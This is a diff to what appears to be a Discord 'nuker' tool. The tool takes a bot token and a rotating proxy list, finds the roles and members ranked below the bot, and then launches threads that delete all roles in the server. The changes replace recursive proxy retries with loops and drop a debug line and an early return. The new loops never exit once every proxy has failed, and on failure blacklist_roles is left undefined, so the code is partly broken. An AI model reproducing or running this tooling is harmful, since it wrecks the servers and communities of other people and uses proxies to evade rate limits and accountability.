@@ -43,53 +43,53 @@ def sort_roles(token, proxy, guildid, send_errors, proxylist):
 
 
 def get_bot_highest_role_position(token, proxy, guildid, botid, sorted_roles, send_errors, proxylist):
-    try:
-        response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members/{botid}", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}, timeout=4)
-        if response.status_code == 200:
-            data = response.json()
-            bot_roles = data['roles']
-            bot_highest_role_position = max([role['position'] for role in sorted_roles if role['id'] in bot_roles], default=-1)
-            return bot_highest_role_position
-        else:
-            print(f"Failed to fetch bot roles. Status code: {response.status_code}")
-            return -1
-    except Exception as e:
-        if send_errors.lower().strip() == "y":
-            print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
-        proxylist.remove(proxy)
-        if not proxylist:
-            cprint ("ALL PROXIES HAVE FAILED!", 1)
-        else:
-            proxy = random.choice(proxylist)
-            get_bot_highest_role_position(token, proxy, guildid, botid, sorted_roles, send_errors, proxylist)
+    while True:
+        try:
+            response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members/{botid}", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}, timeout=4)
+            if response.status_code == 200:
+                data = response.json()
+                bot_roles = data['roles']
+                bot_highest_role_position = max([role['position'] for role in sorted_roles if role['id'] in bot_roles], default=-1)
+                return bot_highest_role_position
+            else:
+                cprint(f"Failed to fetch bot roles. Status code: {response.status_code}", 1)
+                return -1
+        except Exception as e:
+            if send_errors.lower().strip() == "y":
+                print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
+            proxylist.remove(proxy)
+            if not proxylist:
+                cprint ("ALL PROXIES HAVE FAILED!", 1)
+            else:
+                proxy = random.choice(proxylist)
 
 def get_blacklist_users(token, proxy, guild_id, sorted_roles, bot_highest_role_position, send_errors, proxylist):
-    try:
-        blacklist_users = []
+    while True:
         try:
-            members_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}, timeout=5)
-            if members_response.status_code == 200:
-                members = members_response.json()
-                for member in members:
-                    user_roles = member['roles']
-                    user_highest_role_position = max([role['position'] for role in sorted_roles if role['id'] in user_roles], default=-1)
-                    if user_highest_role_position > bot_highest_role_position:
-                        blacklist_users.append(member['user']['id'])
-            else:
-                print(f"Failed to fetch guild members. Status code: {members_response.status_code}")
+            blacklist_users = []
+            try:
+                members_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}, timeout=5)
+                if members_response.status_code == 200:
+                    members = members_response.json()
+                    for member in members:
+                        user_roles = member['roles']
+                        user_highest_role_position = max([role['position'] for role in sorted_roles if role['id'] in user_roles], default=-1)
+                        if user_highest_role_position > bot_highest_role_position:
+                            blacklist_users.append(member['user']['id'])
+                else:
+                    print(f"Failed to fetch guild members. Status code: {members_response.status_code}")
+            except Exception as e:
+                print(f"Error fetching blacklist users: {e}")
+            
+            return blacklist_users
         except Exception as e:
-            print(f"Error fetching blacklist users: {e}")
-        
-        return blacklist_users
-    except Exception as e:
-        if send_errors.lower().strip() == "y":
-            print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
-        proxylist.remove(proxy)
-        if not proxylist:
-            cprint ("ALL PROXIES HAVE FAILED!", 1)
-        else:
-            proxy = random.choice(proxylist)
-            get_blacklist_users(token, proxy, guild_id, sorted_roles, bot_highest_role_position, send_errors, proxylist)    
+            if send_errors.lower().strip() == "y":
+                print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
+            proxylist.remove(proxy)
+            if not proxylist:
+                cprint ("ALL PROXIES HAVE FAILED!", 1)
+            else:
+                proxy = random.choice(proxylist)
 
 # Other functions
 
@@ -379,14 +379,12 @@ def bot_nuker_helper():
     proxy = random.choice(proxylist)
     sorted_roles = sort_roles(token, proxy, guildid, send_errors, proxylist)
     if sorted_roles:
-        print("Debug 1")
         bot_highest_role_position = get_bot_highest_role_position(token, proxy, guildid, botid, sorted_roles, send_errors, proxylist)
         blacklist_roles = [role['id'] for role in sorted_roles if role['position'] >= bot_highest_role_position]
         blacklist_users = get_blacklist_users(token, proxy, guildid, sorted_roles, bot_highest_role_position, send_errors, proxylist)
         cprint("Fetched users/roles", 0)
     else:
         cprint("Failed to fetch users/roles", 1)
-        return
 
     thread = threading.Thread(target=delete_all_roles, args=(token, guildid, botid, max_threads, proxylist, send_errors, blacklist_roles))
     thread.start()
